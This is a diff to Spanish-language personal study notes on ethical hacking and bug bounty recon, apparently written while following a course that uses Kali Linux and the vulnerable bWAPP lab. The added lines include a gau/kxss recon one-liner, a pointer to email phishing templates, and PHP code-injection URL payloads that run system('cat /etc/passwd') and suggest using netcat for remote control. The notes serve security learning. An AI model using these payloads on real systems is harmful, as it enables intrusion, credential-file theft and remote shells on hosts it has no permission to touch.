@@ -37,6 +37,12 @@ httpx -l hosts.txt -silent > httpx.txt
 # subfinder -d hackerone.com | httpx -title -tech-detect -status-code -title -follow-redirects
 ```  
 
+Otro:  
+```
+gau -subs target.com | kxss
+```
+
+
 ---  
 
 **Opción 2**  
@@ -109,9 +115,10 @@ Luego
 ---  
 
 ## Curso Become Ethical Hacker in 15 Hours - 2021  
+
 https://www.udemy.com/course/become-ethical-hacker-in-15-hours  
 
-Toma como base la utilización de Kali Linux.  
+Toma como base la utilización de [Kali Linux](https://www.kali.org/) y el proyecto vulnerable [bWAPP](https://sourceforge.net/projects/bwapp/).  
 
 ### Recon  
 
@@ -394,5 +401,26 @@ Probar agregar en el email del usuario:
 Templates para hacer email phishing.  
 https://github.com/wildbit/postmark-templates  
 
-En Burp , hay una solapa decoder donde se puede copiar el contenido para codificarlo.  
+En Burp , hay una solapa "Decoder" donde se puede copiar el contenido para codificarlo.  
+
+
+- PHP Code injection  
+
+Por ejemplo vemos q cambiando datos de un parámetro podemos ejecutar código PHP.  
+
+En una url:  
+`http://host/dir/prueba.php?message=test`  
+por
+`http://host/dir/prueba.php?message=test; phpinfo();`  
+`http://host/dir/prueba.php?message=test; system("pwd");`  
+`http://host/dir/prueba.php?message=test; system("cat /etc/passwd");`  
+
+Si responden, se puede hacer un `which nc` para saber el path de netcat , y ejecutar nc para manejo remoto.  
+
+
+- HTML Insecure Local Storage  
+
+
+
+
 
